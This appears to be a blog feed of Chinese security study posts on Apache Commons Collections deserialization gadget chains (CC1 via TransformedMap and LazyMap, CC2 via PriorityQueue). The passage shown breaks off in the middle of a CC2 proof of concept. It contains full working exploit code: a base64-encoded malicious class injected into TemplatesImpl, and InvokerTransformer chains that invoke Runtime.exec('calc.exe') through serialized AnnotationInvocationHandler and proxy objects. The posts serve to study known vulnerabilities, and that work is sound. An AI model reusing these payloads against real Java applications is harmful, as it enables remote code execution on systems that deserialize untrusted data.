class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getOutputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>])<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span>  <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class,transformedMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollection1（LazyMap）</title>
    <link href="/2022/03/04/CommonCollection1%EF%BC%88LazyMap%EF%BC%89/"/>
    <url>/2022/03/04/CommonCollection1%EF%BC%88LazyMap%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonCollection1（LazyMap）"><a href="#CommonCollection1（LazyMap）" class="headerlink" title="CommonCollection1（LazyMap）"></a>CommonCollection1（LazyMap）</h1><p>今天准备复习cc3，但是想到其实cc3是cc2和cc1的结合。然后那时候都忘记复习cc1的另外一条链子了。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">objectInputStream.read<span class="hljs-constructor">Object()</span><br> <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span>                     <br></code></pre></td></tr></table></figure><p>变得无非就是 **TransformedMap.setValue()<strong>这一步变成了，</strong>LazyMap.get()**，LazyMap这里相对来说更繁琐一些。<br>逐个分析。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041849264.png" alt="QQ截图20220304184908"></p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap()"></a>LazyMap()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041833631.png" alt="QQ截图20220304183257"></p><p>其中的get方法调用了<strong>transform</strong>，后续跟transform一样。<br>看一下<strong>factory</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041903384.png" alt="QQ截图20220304183440"></p><p>可控。那么现在就要找哪里调用了<strong>get（）</strong>方法。</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>其中的<strong>invoke</strong>刚好调用了<strong>get</strong>方法。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041837323.png" alt="QQ截图20220304183737"></p><p>可以看到这里的<strong>menberValues</strong>，也是可控的。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041903317.png" alt="QQ截图20220304183835"></p><p>在注意的一点就是这里继承了<strong>InvocationHandler</strong>。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041839966.png" alt="QQ截图20220304183700"></p><p>那么要调用这里的<strong>invoke</strong>就轻而易举了。直接一波动态代理。至于动态代理emmm之前复习文章有。嘿嘿。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>代理后的对象叫做proxyMap，但不能直接对其进行序列化，因为入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1DemoTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> LazyMap.decorate(objectObjectHashMap, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, decorate);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, (InvocationHandler) o);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, proxyMap);<br>        serialize(o1);<br>        unserialize(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections2</title>
    <link href="/2022/03/03/CommonsCollections2/"/>
    <url>/2022/03/03/CommonsCollections2/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><p>如果CC1理解的很充分，理解CC2就跟玩一样。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br> <br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235712.png" alt="QQ截图20220303211048"></p><p><strong>PriorityQueue</strong>就相当于代替了cc1中的<strong>AnnotationInvocationHandler</strong>。先继续跟进入<strong>heapify()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235455.png" alt="QQ截图20220303211540"></p><p>然后继续跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235683.png" alt="QQ截图20220303211553"></p><p>然后看看这两个地方。发现这里的<strong>siftDownUsingComparator()<strong>里面调用了</strong>comparator.compare</strong>。而这里凑巧的就是 <strong>TransformingComparator</strong><br>实现了 <strong>compare</strong>接口。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235792.png" alt="QQ截图20220303211839"></p><p>并且调用了<strong>transform</strong>。后续就跟cc1，差不多。<br>一个一个分析。</p><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br></code></pre></td></tr></table></figure><p>传入就可，后续直接调用<strong>transform</strong></p><h2 id="heapify"><a href="#heapify" class="headerlink" title="heapify()"></a>heapify()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>          siftDown(i, (E) queue[i]);<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里判断了size&gt;&gt;&gt;1。才能进入  <strong>siftDown(i, (E) queue[i]);</strong></p><h2 id="siftDown"><a href="#siftDown" class="headerlink" title="siftDown()"></a>siftDown()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>      <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>          siftDownUsingComparator(k, x);<br>      <span class="hljs-keyword">else</span><br>          siftDownComparable(k, x);<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里为了进入 <strong>siftDownUsingComparator(k, x)<strong>要保证</strong>comparator</strong>不可以为空。<br>并且这里传入的值不能小于1。不然这里会报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032236941.png" alt="QQ截图20220303214616"></p><p>所以构造。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>, transformingComparator);<br></code></pre></td></tr></table></figure><h2 id="POC（残缺）"><a href="#POC（残缺）" class="headerlink" title="POC（残缺）"></a>POC（残缺）</h2><p>这样就是是没有反序列化也能进行弹计算器，还弹了连个。emmm…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc2Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span 